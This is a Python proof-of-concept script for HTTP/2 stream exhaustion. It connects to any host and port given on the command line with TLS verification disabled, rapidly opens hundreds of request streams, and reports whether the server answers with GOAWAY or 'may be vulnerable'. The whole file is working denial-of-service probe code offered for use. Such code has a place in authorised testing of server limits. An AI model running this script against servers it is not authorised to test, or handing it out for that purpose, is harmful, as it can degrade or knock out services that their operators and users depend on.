#!/usr/bin/env python3
import sys
import socket
import ssl
import struct
from h2 import Connection
from h2.config import Http2Configuration
from h2.events import ResponseReceived, DataReceived, StreamEnded, ConnectionTerminated, RemoteSettingsUpdate
from h2.exceptions import StreamClosedError, ProtocolError, FlowControlError, StreamResetError

def create_http2_connection(host, port, use_tls=True):
    """Establishes an HTTP/2 connection to the target server."""
    if use_tls:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=host)
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    sock.settimeout(10)
    sock.connect((host, port))
    
    # Initialize h2 connection
    config = Http2Configuration(validate_inbound_headers=False)
    conn = Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    
    return sock, conn

def send_rapid_streams(conn, sock, num_streams=1000):
    """Sends HEADERS frames to open multiple streams rapidly."""
    open_streams = []
    errors = []
    
    print(f"[*] Attempting to open {num_streams} streams rapidly...")
    
    for i in range(1, num_streams + 1):
        stream_id = conn.get_next_available_stream_id()
        headers = [(':method', 'GET'), (':path', '/'), (':scheme', 'https'), (':authority', 'example.com')]
        
        try:
            conn.send_headers(stream_id, headers, end_stream=True)
            open_streams.append(stream_id)
            
            # Send data in chunks to avoid overwhelming the socket buffer
            if i % 100 == 0:
                sock.sendall(conn.data_to_send())
                data = sock.recv(4096)
                conn.receive_data(data)
                
        except (StreamClosedError, ProtocolError, FlowControlError, StreamResetError) as e:
            errors.append((stream_id, str(e)))
            print(f"[!] Error on stream {stream_id}: {e}")
            break
    
    # Flush remaining data
    sock.sendall(conn.data_to_send())
    return open_streams, errors

def monitor_server_response(conn, sock, timeout=5):
    """Monitors server response for GOAWAY or connection termination."""
    sock.settimeout(timeout)
    goaway_received = False
    
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            events = conn.receive_data(data)
            for event in events:
                if isinstance(event, ConnectionTerminated):
                    print(f"[+] Server terminated connection: {event.error_code}")
                    goaway_received = True
                    break
                elif hasattr(event, 'error_code'):
                    print(f"[+] Stream error/reset: {event.error_code}")
    except socket.timeout:
        print("[*] No immediate server response or timeout reached.")
    except Exception as e:
        print(f"[!] Error monitoring response: {e}")
    
    return goaway_received

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 poc_stream_id_exhaustion.py <host> <port> [use_tls]")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    use_tls = sys.argv[3].lower() == 'true' if len(sys.argv) > 3 else True
    
    print(f"[*] Connecting to {host}:{port} (TLS: {use_tls})...")
    sock, conn = create_http2_connection(host, port, use_tls)
    
    # Initial handshake and settings exchange
    data = sock.recv(4096)
    conn.receive_data(data)
    sock.sendall(conn.data_to_send())
    
    print("[*] HTTP/2 connection established.")
    
    # Send rapid streams
    open_streams, errors = send_rapid_streams(conn, sock, num_streams=500)
    
    print(f"[*] Successfully opened {len(open_streams)} streams.")
    if errors:
        print(f"[*] Encountered {len(errors)} errors during stream creation.")
    
    # Monitor server behavior
    goaway = monitor_server_response(conn, sock)
    
    if goaway:
        print("[+] Server sent GOAWAY, indicating it is enforcing stream limits.")
    else:
        print("[-] Server did not send GOAWAY. It may be vulnerable to stream exhaustion.")
    
    sock.close()

if __name__ == "__main__":
    main()